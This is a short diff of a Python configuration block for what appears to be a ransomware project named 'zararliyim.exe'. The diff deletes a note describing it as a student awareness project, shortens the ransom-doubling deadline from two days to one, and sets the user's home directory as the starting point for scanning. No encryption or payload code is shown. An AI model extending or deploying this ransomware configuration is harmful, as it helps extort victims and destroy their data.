@@ -3,14 +3,11 @@ from datetime import datetime
 
 who_we_are = "APT-Al"
 version = "v1.1" # XXXX
-what_is_my_purpose = """Hi there,
-we are a group of university students from Hacettepe.
-We aim that the main reason for starting the project is increasing awareness of cybersecurity by informing people."""
 
 what_is_my_name = "zararliyim.exe" 
 what_is_my_id = "1"# ransomwareID XXXX
 when_did_i_work = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-how_many_days_to_double_ransom = 2
+how_many_days_to_double_ransom = 1
 
 # the beginning point of recon
 root_directory = os.path.expanduser('~')
